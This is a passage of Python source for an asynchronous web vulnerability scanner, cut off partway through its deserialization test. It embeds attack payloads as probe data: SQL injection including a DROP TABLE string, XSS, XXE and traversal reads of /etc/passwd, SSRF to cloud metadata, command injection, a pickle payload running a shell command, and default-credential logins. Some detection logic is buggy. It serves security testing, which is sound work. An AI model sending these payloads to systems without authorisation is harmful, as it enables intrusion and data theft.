"""Web application scanner for discovering vulnerabilities."""

import asyncio
import httpx
import re
import json
from typing import Dict, Any, List, Optional
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup
import structlog

logger = structlog.get_logger()


class WebScanner:
    """Scans web applications for potential vulnerabilities."""

    # Maximum seconds any single test may run before being cancelled.
    PER_TEST_TIMEOUT = 30

    def __init__(self, base_url: str, timeout: int = 5, progress_callback=None):
        """
        Initialize web scanner.

        Args:
            base_url: Base URL of the application to scan
            timeout: Per-request read timeout in seconds
            progress_callback: Optional callback for progress updates
        """
        self.base_url = base_url.rstrip('/')
        # Separate connect/read timeouts so a hung connection fails fast.
        self.timeout = httpx.Timeout(connect=3.0, read=float(timeout), write=3.0, pool=2.0)
        self.endpoints = []
        self.vulnerabilities = []
        self.progress_callback = progress_callback

        logger.info("web_scanner_initialized", base_url=base_url)
    
    def _emit_progress(self, test_name: str, status: str = "running", vulnerability=None):
        """Emit progress update if callback is provided."""
        if self.progress_callback:
            self.progress_callback.update(test_name, status, vulnerability)
    
    async def scan(self) -> Dict[str, Any]:
        """
        Perform comprehensive security scan.
        
        Returns:
            Scan results with discovered vulnerabilities
        """
        logger.info("starting_security_scan", url=self.base_url)
        
        # Define all tests with their display names
        tests = [
            # Step 1: Discover endpoints
            (self._discover_endpoints, "Discovering Endpoints"),
            
            # Step 2: Original 5 tests
            (self._test_sql_injection, "SQL Injection"),
            (self._test_xss, "Cross-Site Scripting (XSS)"),
            (self._test_auth_bypass, "Authentication Bypass"),
            (self._test_race_conditions, "Race Conditions"),
            (self._test_idor, "Insecure Direct Object Reference (IDOR)"),
            
            # Step 3: Additional 12 tests
            (self._test_csrf, "Cross-Site Request Forgery (CSRF)"),
            (self._test_xxe, "XML External Entity (XXE)"),
            (self._test_ssrf, "Server-Side Request Forgery (SSRF)"),
            (self._test_command_injection, "Command Injection"),
            (self._test_path_traversal, "Path Traversal"),
            (self._test_open_redirect, "Open Redirect"),
            (self._test_security_headers, "Missing Security Headers"),
            (self._test_cors_misconfiguration, "CORS Misconfiguration"),
            (self._test_sensitive_data_exposure, "Sensitive Data Exposure"),
            (self._test_broken_authentication, "Broken Authentication"),
            (self._test_mass_assignment, "Mass Assignment"),
            (self._test_api_rate_limiting, "API Rate Limiting"),
            
            # Step 4: Advanced 8 tests
            (self._test_nosql_injection, "NoSQL Injection"),
            (self._test_ldap_injection, "LDAP Injection"),
            (self._test_ssti, "Server-Side Template Injection (SSTI)"),
            (self._test_insecure_deserialization, "Insecure Deserialization"),
            (self._test_host_header_injection, "Host Header Injection"),
            (self._test_jwt_vulnerabilities, "JWT Vulnerabilities"),
            (self._test_graphql_injection, "GraphQL Injection"),
            (self._test_file_upload, "File Upload Vulnerabilities"),
            
            # Step 5: Phase 2 - Critical 10 tests
            (self._test_xpath_injection, "XPath Injection"),
            (self._test_crlf_injection, "CRLF Injection"),
            (self._test_session_fixation, "Session Fixation"),
            (self._test_privilege_escalation, "Privilege Escalation"),
            (self._test_information_disclosure, "Information Disclosure"),
            (self._test_backup_files, "Backup Files Exposure"),
            (self._test_weak_ssl_tls, "Weak SSL/TLS Configuration"),
            (self._test_dom_xss, "DOM-Based XSS"),
            (self._test_clickjacking, "Clickjacking"),
            (self._test_http_methods, "HTTP Methods"),
            
            # Step 6: Phase 3 - High-value 10 tests
            (self._test_email_header_injection, "Email Header Injection"),
            (self._test_code_injection, "Code Injection"),
            (self._test_account_enumeration, "Account Enumeration"),
            (self._test_missing_function_level_access, "Missing Function Level Access"),
            (self._test_source_code_disclosure, "Source Code Disclosure"),
            (self._test_certificate_validation, "Certificate Validation"),
            (self._test_price_manipulation, "Price Manipulation"),
            (self._test_api_versioning, "API Versioning Issues"),
            (self._test_websocket_vulnerabilities, "WebSocket Vulnerabilities"),
            (self._test_cache_poisoning, "Cache Poisoning"),
            
            # Step 7: Phase 4 - Comprehensive 25 tests
            (self._test_expression_language_injection, "Expression Language Injection"),
            (self._test_weak_password_policy, "Weak Password Policy"),
            (self._test_brute_force_protection, "Brute Force Protection"),
            (self._test_oauth_misconfiguration, "OAuth Misconfiguration"),
            (self._test_horizontal_privilege_escalation, "Horizontal Privilege Escalation"),
            (self._test_forced_browsing, "Forced Browsing"),
            (self._test_directory_listing, "Directory Listing"),
            (self._test_api_key_exposure, "API Key Exposure"),
            (self._test_weak_hashing, "Weak Hashing Algorithms"),
            (self._test_insecure_random, "Insecure Random Number Generation"),
            (self._test_quantity_manipulation, "Quantity Manipulation"),
            (self._test_workflow_bypass, "Workflow Bypass"),
            (self._test_excessive_data_exposure, "Excessive Data Exposure"),
            (self._test_lack_of_rate_limiting, "Lack of Rate Limiting"),
            (self._test_improper_assets_management, "Improper Assets Management"),
            (self._test_postmessage_vulnerabilities, "PostMessage Vulnerabilities"),
            (self._test_mime_sniffing, "MIME Sniffing"),
            (self._test_http_parameter_pollution, "HTTP Parameter Pollution"),
            (self._test_dns_rebinding, "DNS Rebinding"),
            (self._test_ssi_injection, "Server-Side Includes (SSI) Injection"),
            (self._test_api_idor, "API IDOR"),
            (self._test_api_mass_assignment, "API Mass Assignment"),
            (self._test_api_auth_bypass, "API Authentication Bypass"),
            (self._test_api_injection, "API Injection"),
            (self._test_insecure_api_endpoints, "Insecure API Endpoints"),
        ]
        
        # Run all tests. Each is wrapped in wait_for() so a single slow/
        # unresponsive target cannot stall the entire scan pipeline.
        for test_func, test_name in tests:
            vuln_count_before = len(self.vulnerabilities)
            self._emit_progress(test_name, "running")

            try:
                await asyncio.wait_for(test_func(), timeout=self.PER_TEST_TIMEOUT)
            except asyncio.TimeoutError:
                logger.warning(
                    "test_timed_out",
                    test=test_name,
                    timeout_seconds=self.PER_TEST_TIMEOUT
                )
            except Exception as e:
                logger.warning("test_error", test=test_name, error=str(e))

            # Check if new vulnerability was found
            vuln_count_after = len(self.vulnerabilities)
            if vuln_count_after > vuln_count_before:
                new_vuln = self.vulnerabilities[-1]
                self._emit_progress(test_name, "completed", new_vuln)
            else:
                self._emit_progress(test_name, "completed")
        
        results = {
            "base_url": self.base_url,
            "endpoints_found": len(self.endpoints),
            "vulnerabilities_found": len(self.vulnerabilities),
            "endpoints": self.endpoints,
            "vulnerabilities": self.vulnerabilities
        }
        
        logger.info(
            "scan_complete",
            endpoints=len(self.endpoints),
            vulnerabilities=len(self.vulnerabilities)
        )
        
        return results
    
    def _replace_path_params(self, path: str) -> str:
        """Replace path parameters with test values."""
        # Replace {param} with test value 1
        return re.sub(r'\{[^}]+\}', '1', path)
    
    async def _discover_endpoints(self):
        """Discover API endpoints through multiple methods."""
        logger.info("discovering_endpoints")
        discovered = set()
        
        async with httpx.AsyncClient(timeout=self.timeout, follow_redirects=True) as client:
            # Method 1: Try to find OpenAPI/Swagger spec
            spec_paths = [
                '/openapi.json', '/swagger.json', '/api-docs', 
                '/v1/swagger.json', '/api/swagger.json',
                '/docs', '/api/docs', '/swagger-ui.html'
            ]
            
            for spec_path in spec_paths:
                try:
                    url = urljoin(self.base_url, spec_path)
                    response = await client.get(url)
                    if response.status_code == 200:
                        try:
                            spec = response.json()
                            if 'paths' in spec:
                                for path in spec['paths'].keys():
                                    discovered.add(path)
                                logger.info("found_openapi_spec", endpoints=len(spec['paths']))
                        except:
                            pass
                except:
                    pass
            
            # Method 2: Crawl homepage to find links
            try:
                response = await client.get(self.base_url)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links
                    for link in soup.find_all(['a', 'link']):
                        href = link.get('href', '')
                        if href and href.startswith('/') and not href.startswith('//'):
                            discovered.add(href.split('?')[0])
                    
                    # Find script tags and analyze for API calls
                    for script in soup.find_all('script'):
                        script_content = script.string or ''
                        # Look for fetch/axios/$.ajax patterns
                        api_patterns = [
                            r'["\']/(api/[^"\']+)["\']',
                            r'fetch\(["\']([^"\']+)["\']',
                            r'axios\.[a-z]+\(["\']([^"\']+)["\']',
                            r'\$\.ajax\(["\']([^"\']+)["\']'
                        ]
                        for pattern in api_patterns:
                            matches = re.findall(pattern, script_content)
                            for match in matches:
                                if match.startswith('/'):
                                    discovered.add(match.split('?')[0])
                    
                    logger.info("crawled_homepage", links_found=len(discovered))
            except Exception as e:
                logger.warning("homepage_crawl_failed", error=str(e))
            
            # Method 3: Common API endpoints (minimal fallback)
            if len(discovered) == 0:
                common_endpoints = ['/api', '/api/v1', '/health', '/status']
                discovered.update(common_endpoints)
        
        # Store discovered endpoints with concrete paths
        for path in discovered:
            concrete_path = self._replace_path_params(path)
            self.endpoints.append({
                "path": path,
                "concrete_path": concrete_path,
                "method": "GET"
            })
        
        logger.info("endpoint_discovery_complete", total=len(self.endpoints))

    
    # ==================== ORIGINAL 5 TESTS ====================
    
    async def _test_sql_injection(self):
        """Test for SQL injection vulnerabilities."""
        logger.info("testing_sql_injection")
        
        payloads = [
            "' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "1' UNION SELECT NULL--",
            "'; DROP TABLE users--"
        ]
        
        error_patterns = [
            "sql", "mysql", "sqlite", "postgresql", "oracle",
            "syntax error", "database", "query failed"
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in payloads:
                    try:
                        # Test in query parameters
                        test_url = f"{url}?id={quote(payload)}"
                        response = await client.get(test_url)
                        
                        # Check for SQL errors in response
                        response_text = response.text.lower()
                        for pattern in error_patterns:
                            if pattern in response_text:
                                self.vulnerabilities.append({
                                    "type": "SQL Injection",
                                    "severity": "CRITICAL",
                                    "endpoint": endpoint['path'],
                                    "method": "GET",
                                    "payload": payload,
                                    "evidence": f"SQL error pattern found: {pattern}"
                                })
                                logger.warning("sql_injection_found", endpoint=endpoint['path'])
                                break
                    except:
                        pass
    
    async def _test_xss(self):
        """Test for Cross-Site Scripting vulnerabilities."""
        logger.info("testing_xss")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg/onload=alert(1)>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>"
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in payloads:
                    try:
                        test_url = f"{url}?q={quote(payload)}"
                        response = await client.get(test_url)
                        
                        # Check if payload is reflected without encoding
                        if payload in response.text or payload.replace("'", "&#39;") not in response.text:
                            if "<script>" in response.text or "onerror=" in response.text:
                                self.vulnerabilities.append({
                                    "type": "Cross-Site Scripting (XSS)",
                                    "severity": "HIGH",
                                    "endpoint": endpoint['path'],
                                    "method": "GET",
                                    "payload": payload,
                                    "evidence": "Payload reflected without proper encoding"
                                })
                                logger.warning("xss_found", endpoint=endpoint['path'])
                                break
                    except:
                        pass
    
    async def _test_auth_bypass(self):
        """Test for authentication bypass vulnerabilities."""
        logger.info("testing_auth_bypass")
        
        bypass_headers = [
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"Authorization": "Bearer invalid_token"}
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                try:
                    # First, try without auth
                    normal_response = await client.get(url)
                    
                    # If we get 401/403, try bypass techniques
                    if normal_response.status_code in [401, 403]:
                        for headers in bypass_headers:
                            try:
                                bypass_response = await client.get(url, headers=headers)
                                if bypass_response.status_code == 200:
                                    self.vulnerabilities.append({
                                        "type": "Authentication Bypass",
                                        "severity": "CRITICAL",
                                        "endpoint": endpoint['path'],
                                        "method": "GET",
                                        "payload": str(headers),
                                        "evidence": f"Bypassed {normal_response.status_code} with custom headers"
                                    })
                                    logger.warning("auth_bypass_found", endpoint=endpoint['path'])
                                    break
                            except:
                                pass
                except:
                    pass
    
    async def _test_race_conditions(self):
        """Test for race condition vulnerabilities."""
        logger.info("testing_race_conditions")
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                # Only test POST/PUT/DELETE endpoints
                if endpoint['method'] not in ['POST', 'PUT', 'DELETE']:
                    continue
                
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                try:
                    # Send concurrent requests to detect race window
                    tasks = [client.post(url, json={"test": "data"}) for _ in range(5)]
                    responses = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Check for inconsistent responses
                    status_codes = [r.status_code for r in responses if isinstance(r, httpx.Response)]
                    if len(set(status_codes)) > 1:
                        self.vulnerabilities.append({
                            "type": "Race Condition",
                            "severity": "MEDIUM",
                            "endpoint": endpoint['path'],
                            "method": endpoint['method'],
                            "payload": "Concurrent requests",
                            "evidence": f"Inconsistent responses: {status_codes}"
                        })
                        logger.warning("race_condition_found", endpoint=endpoint['path'])
                except:
                    pass
    
    async def _test_idor(self):
        """Test for Insecure Direct Object Reference vulnerabilities."""
        logger.info("testing_idor")
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                # Test with different IDs
                test_ids = ['1', '2', '999', '0', '-1']
                
                for test_id in test_ids:
                    try:
                        test_url = f"{url}?id={test_id}"
                        response = await client.get(test_url)
                        
                        # Check if we can access different user data
                        if response.status_code == 200:
                            response_text = response.text.lower()
                            sensitive_patterns = ['user', 'email', 'password', 'token', 'private']
                            
                            if any(pattern in response_text for pattern in sensitive_patterns):
                                self.vulnerabilities.append({
                                    "type": "IDOR (Insecure Direct Object Reference)",
                                    "severity": "HIGH",
                                    "endpoint": endpoint['path'],
                                    "method": "GET",
                                    "payload": f"id={test_id}",
                                    "evidence": "Possible unauthorized access to user data"
                                })
                                logger.warning("idor_found", endpoint=endpoint['path'])
                                break
                    except:
                        pass

    
    # ==================== ADDITIONAL 12 TESTS ====================
    
    async def _test_csrf(self):
        """Test for CSRF vulnerabilities."""
        logger.info("testing_csrf")
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                if endpoint['method'] not in ['POST', 'PUT', 'DELETE']:
                    continue
                
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                try:
                    # Try POST without CSRF token
                    response = await client.post(url, json={"test": "data"})
                    
                    # If request succeeds without token, it's vulnerable
                    if response.status_code in [200, 201, 204]:
                        # Check if response doesn't mention CSRF
                        if 'csrf' not in response.text.lower():
                            self.vulnerabilities.append({
                                "type": "CSRF (Cross-Site Request Forgery)",
                                "severity": "HIGH",
                                "endpoint": endpoint['path'],
                                "method": endpoint['method'],
                                "payload": "POST without CSRF token",
                                "evidence": "Request succeeded without CSRF protection"
                            })
                            logger.warning("csrf_found", endpoint=endpoint['path'])
                except:
                    pass
    
    async def _test_xxe(self):
        """Test for XML External Entity vulnerabilities."""
        logger.info("testing_xxe")
        
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>'''
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                try:
                    response = await client.post(
                        url,
                        content=xxe_payload,
                        headers={"Content-Type": "application/xml"}
                    )
                    
                    # Check for file content in response
                    if 'root:' in response.text or '/bin/bash' in response.text:
                        self.vulnerabilities.append({
                            "type": "XXE (XML External Entity)",
                            "severity": "CRITICAL",
                            "endpoint": endpoint['path'],
                            "method": "POST",
                            "payload": "XXE payload",
                            "evidence": "File content exposed in response"
                        })
                        logger.warning("xxe_found", endpoint=endpoint['path'])
                except:
                    pass
    
    async def _test_ssrf(self):
        """Test for Server-Side Request Forgery vulnerabilities."""
        logger.info("testing_ssrf")
        
        ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal",
            "file:///etc/passwd"
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in ssrf_payloads:
                    try:
                        test_url = f"{url}?url={quote(payload)}"
                        response = await client.get(test_url)
                        
                        # Check for internal content
                        indicators = ['localhost', 'metadata', 'root:', 'ami-id']
                        if any(ind in response.text.lower() for ind in indicators):
                            self.vulnerabilities.append({
                                "type": "SSRF (Server-Side Request Forgery)",
                                "severity": "CRITICAL",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": payload,
                                "evidence": "Internal resource accessible"
                            })
                            logger.warning("ssrf_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_command_injection(self):
        """Test for command injection vulnerabilities."""
        logger.info("testing_command_injection")
        
        payloads = [
            "; ls",
            "| whoami",
            "`id`",
            "$(whoami)",
            "&& cat /etc/passwd"
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in payloads:
                    try:
                        test_url = f"{url}?cmd={quote(payload)}"
                        response = await client.get(test_url)
                        
                        # Check for command output
                        indicators = ['uid=', 'gid=', 'root:', 'bin/bash', 'total ']
                        if any(ind in response.text for ind in indicators):
                            self.vulnerabilities.append({
                                "type": "Command Injection",
                                "severity": "CRITICAL",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": payload,
                                "evidence": "Command output detected in response"
                            })
                            logger.warning("command_injection_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_path_traversal(self):
        """Test for path traversal vulnerabilities."""
        logger.info("testing_path_traversal")
        
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in payloads:
                    try:
                        test_url = f"{url}?file={quote(payload)}"
                        response = await client.get(test_url)
                        
                        # Check for file content
                        if 'root:' in response.text or '[extensions]' in response.text:
                            self.vulnerabilities.append({
                                "type": "Path Traversal",
                                "severity": "HIGH",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": payload,
                                "evidence": "System file content exposed"
                            })
                            logger.warning("path_traversal_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_open_redirect(self):
        """Test for open redirect vulnerabilities."""
        logger.info("testing_open_redirect")
        
        payloads = [
            "http://evil.com",
            "//evil.com",
            "https://evil.com",
            "javascript:alert(1)"
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, follow_redirects=False) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in payloads:
                    try:
                        test_url = f"{url}?redirect={quote(payload)}"
                        response = await client.get(test_url)
                        
                        # Check for redirect to external site
                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')
                            if 'evil.com' in location or location.startswith('//'):
                                self.vulnerabilities.append({
                                    "type": "Open Redirect",
                                    "severity": "MEDIUM",
                                    "endpoint": endpoint['path'],
                                    "method": "GET",
                                    "payload": payload,
                                    "evidence": f"Redirects to: {location}"
                                })
                                logger.warning("open_redirect_found", endpoint=endpoint['path'])
                                break
                    except:
                        pass
    
    async def _test_security_headers(self):
        """Test for missing security headers."""
        logger.info("testing_security_headers")
        
        required_headers = {
            'X-Frame-Options': 'DENY or SAMEORIGIN',
            'X-Content-Type-Options': 'nosniff',
            'Strict-Transport-Security': 'max-age=31536000',
            'Content-Security-Policy': 'CSP directives',
            'X-XSS-Protection': '1; mode=block'
        }
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            try:
                response = await client.get(self.base_url)
                missing_headers = []
                
                for header, expected in required_headers.items():
                    if header not in response.headers:
                        missing_headers.append(header)
                
                if missing_headers:
                    self.vulnerabilities.append({
                        "type": "Missing Security Headers",
                        "severity": "MEDIUM",
                        "endpoint": "/",
                        "method": "GET",
                        "payload": "N/A",
                        "evidence": f"Missing headers: {', '.join(missing_headers)}"
                    })
                    logger.warning("missing_security_headers", count=len(missing_headers))
            except:
                pass
    
    async def _test_cors_misconfiguration(self):
        """Test for CORS misconfiguration."""
        logger.info("testing_cors_misconfiguration")
        
        test_origins = [
            "http://evil.com",
            "null",
            "http://localhost"
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for origin in test_origins:
                    try:
                        response = await client.get(url, headers={"Origin": origin})
                        
                        acao = response.headers.get('Access-Control-Allow-Origin', '')
                        if acao == origin or acao == '*':
                            self.vulnerabilities.append({
                                "type": "CORS Misconfiguration",
                                "severity": "MEDIUM",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": f"Origin: {origin}",
                                "evidence": f"ACAO header reflects untrusted origin: {acao}"
                            })
                            logger.warning("cors_misconfiguration_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_sensitive_data_exposure(self):
        """Test for sensitive data exposure."""
        logger.info("testing_sensitive_data_exposure")
        
        sensitive_patterns = [
            (r'password["\']?\s*[:=]\s*["\']([^"\']+)', 'password'),
            (r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)', 'api_key'),
            (r'secret["\']?\s*[:=]\s*["\']([^"\']+)', 'secret'),
            (r'token["\']?\s*[:=]\s*["\']([^"\']+)', 'token'),
            (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', 'email')
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                try:
                    response = await client.get(url)
                    
                    for pattern, data_type in sensitive_patterns:
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        if matches:
                            self.vulnerabilities.append({
                                "type": "Sensitive Data Exposure",
                                "severity": "HIGH",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": "N/A",
                                "evidence": f"Exposed {data_type} in response"
                            })
                            logger.warning("sensitive_data_exposure_found", 
                                         endpoint=endpoint['path'], 
                                         data_type=data_type)
                            break
                except:
                    pass
    
    async def _test_broken_authentication(self):
        """Test for broken authentication."""
        logger.info("testing_broken_authentication")
        
        weak_credentials = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("test", "test")
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            # Only test login endpoints that were discovered
            login_keywords = ['login', 'signin', 'auth', 'authenticate']
            login_endpoints = [ep for ep in self.endpoints 
                             if any(keyword in ep['path'].lower() for keyword in login_keywords)]
            
            # If no login endpoints found, try common ones
            if not login_endpoints:
                login_paths = ['/login', '/api/login', '/auth/login', '/signin']
                for login_path in login_paths:
                    try:
                        test_url = urljoin(self.base_url, login_path)
                        check = await client.get(test_url)
                        if check.status_code != 404:
                            login_endpoints.append({"path": login_path, "concrete_path": login_path})
                    except:
                        pass
            
            for login_endpoint in login_endpoints:
                url = urljoin(self.base_url, login_endpoint['concrete_path'])
                
                for username, password in weak_credentials:
                    try:
                        response = await client.post(
                            url,
                            json={"username": username, "password": password}
                        )
                        
                        if response.status_code == 200:
                            response_text = response.text.lower()
                            if 'token' in response_text or 'success' in response_text:
                                self.vulnerabilities.append({
                                    "type": "Broken Authentication",
                                    "severity": "CRITICAL",
                                    "endpoint": login_path,
                                    "method": "POST",
                                    "payload": f"{username}:{password}",
                                    "evidence": "Weak credentials accepted"
                                })
                                logger.warning("broken_authentication_found", endpoint=login_path)
                                break
                    except:
                        pass
    
    async def _test_mass_assignment(self):
        """Test for mass assignment vulnerabilities."""
        logger.info("testing_mass_assignment")
        
        malicious_fields = {
            "is_admin": True,
            "role": "admin",
            "is_superuser": True,
            "permissions": ["admin"],
            "account_type": "premium"
        }
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                if endpoint['method'] not in ['POST', 'PUT', 'PATCH']:
                    continue
                
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                try:
                    response = await client.post(url, json=malicious_fields)
                    
                    if response.status_code in [200, 201]:
                        response_text = response.text.lower()
                        if any(field.lower() in response_text for field in malicious_fields.keys()):
                            self.vulnerabilities.append({
                                "type": "Mass Assignment",
                                "severity": "HIGH",
                                "endpoint": endpoint['path'],
                                "method": endpoint['method'],
                                "payload": str(malicious_fields),
                                "evidence": "Privileged fields accepted"
                            })
                            logger.warning("mass_assignment_found", endpoint=endpoint['path'])
                except:
                    pass
    
    async def _test_api_rate_limiting(self):
        """Test for missing API rate limiting."""
        logger.info("testing_api_rate_limiting")
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints[:3]:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                try:
                    tasks = [client.get(url) for _ in range(20)]
                    responses = await asyncio.gather(*tasks, return_exceptions=True)

                    success_count = sum(1 for r in responses
                                      if isinstance(r, httpx.Response) and r.status_code == 200)

                    if success_count > 18:
                        self.vulnerabilities.append({
                            "type": "Missing API Rate Limiting",
                            "severity": "MEDIUM",
                            "endpoint": endpoint['path'],
                            "method": "GET",
                            "payload": "50 rapid requests",
                            "evidence": f"{success_count}/50 requests succeeded"
                        })
                        logger.warning("no_rate_limiting_found", endpoint=endpoint['path'])
                except:
                    pass

    
    # ==================== ADVANCED 8 TESTS ====================
    
    async def _test_nosql_injection(self):
        """Test for NoSQL injection vulnerabilities."""
        logger.info("testing_nosql_injection")
        
        payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            "'; return true; var dummy='",
            {"username": {"$ne": None}, "password": {"$ne": None}}
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in payloads:
                    try:
                        if isinstance(payload, dict):
                            response = await client.post(url, json=payload)
                        else:
                            test_url = f"{url}?query={quote(str(payload))}"
                            response = await client.get(test_url)
                        
                        if response.status_code == 200:
                            response_text = response.text.lower()
                            if 'user' in response_text or 'data' in response_text:
                                self.vulnerabilities.append({
                                    "type": "NoSQL Injection",
                                    "severity": "CRITICAL",
                                    "endpoint": endpoint['path'],
                                    "method": "POST" if isinstance(payload, dict) else "GET",
                                    "payload": str(payload),
                                    "evidence": "NoSQL query manipulation successful"
                                })
                                logger.warning("nosql_injection_found", endpoint=endpoint['path'])
                                break
                    except:
                        pass
    
    async def _test_ldap_injection(self):
        """Test for LDAP injection vulnerabilities."""
        logger.info("testing_ldap_injection")
        
        payloads = [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*))(|(cn=*"
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in payloads:
                    try:
                        test_url = f"{url}?user={quote(payload)}"
                        response = await client.get(test_url)
                        
                        ldap_indicators = ['ldap', 'directory', 'cn=', 'ou=', 'dc=']
                        if any(ind in response.text.lower() for ind in ldap_indicators):
                            self.vulnerabilities.append({
                                "type": "LDAP Injection",
                                "severity": "HIGH",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": payload,
                                "evidence": "LDAP query manipulation detected"
                            })
                            logger.warning("ldap_injection_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_ssti(self):
        """Test for Server-Side Template Injection vulnerabilities."""
        logger.info("testing_ssti")
        
        payloads = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{config}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}"
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in payloads:
                    try:
                        test_url = f"{url}?name={quote(payload)}"
                        response = await client.get(test_url)
                        
                        if '49' in response.text or 'config' in response.text.lower():
                            self.vulnerabilities.append({
                                "type": "SSTI (Server-Side Template Injection)",
                                "severity": "CRITICAL",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": payload,
                                "evidence": "Template expression evaluated"
                            })
                            logger.warning("ssti_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_insecure_deserialization(self):
        """Test for insecure deserialization vulnerabilities."""
        logger.info("testing_insecure_deserialization")
        
        pickle_payload = "gASVLgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwGX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2lkJymUhZRSlC4="
        java_payload = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ=="
        
        payloads = [pickle_payload, java_payload]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in payloads:
                    try:
                        response = await client.post(
                            url,
                            content=payload,
                            headers={"Content-Type": "application/x-java-serialized-object"}
                        )
                        
                        indicators = ['pickle', 'serializ', 'unmarshal', 'uid=', 'gid=']
                        if any(ind in response.text.lower() for ind in indicators):
                            self.vulnerabilities.append({
                                "type": "Insecure Deserialization",
                                "severity": "CRITICAL",
                                "endpoint": endpoint['path'],
                                "method": "POST",
                                "payload": "Serialized object",
                                "evidence": "Deserialization vulnerability detected"
                            })
